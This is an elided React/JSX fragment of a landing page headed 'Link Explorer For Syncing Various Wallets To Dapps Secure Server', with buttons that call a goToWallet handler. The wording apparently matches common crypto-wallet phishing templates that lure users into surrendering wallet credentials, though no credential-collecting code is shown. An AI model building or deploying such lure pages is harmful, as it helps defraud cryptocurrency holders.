...
const Landing = () => {
  ...
  return (
    <main className="relative bg-white dark:bg-gray-900 min-h-screen flex flex-col gap-20">
      <section className="max-w-4xl mx-auto flex flex-col gap-4 xl:gap-10 justify-center items-center px-4 md:px-10 mt-10 lg:mt-20">
        <div data-aos="fade-up">
          <h1 className="mb-4 text-4xl tracking-tight font-extrabold text-gray-900 dark:text-white">
            Link Explorer For Syncing Various Wallets To Dapps Secure Server
          </h1>
        ...
        <div className="flex flex-wrap items-center justify-center gap-3 mt-4">
          {quickStart.map((item, index) => (
            <Button key={index} outline pill onClick={goToWallet} color="blue">
              {item.title}
            </Button>
          ))}
        </div>
      ...
      <section className="bg-gray-50 dark:bg-[#101720]">
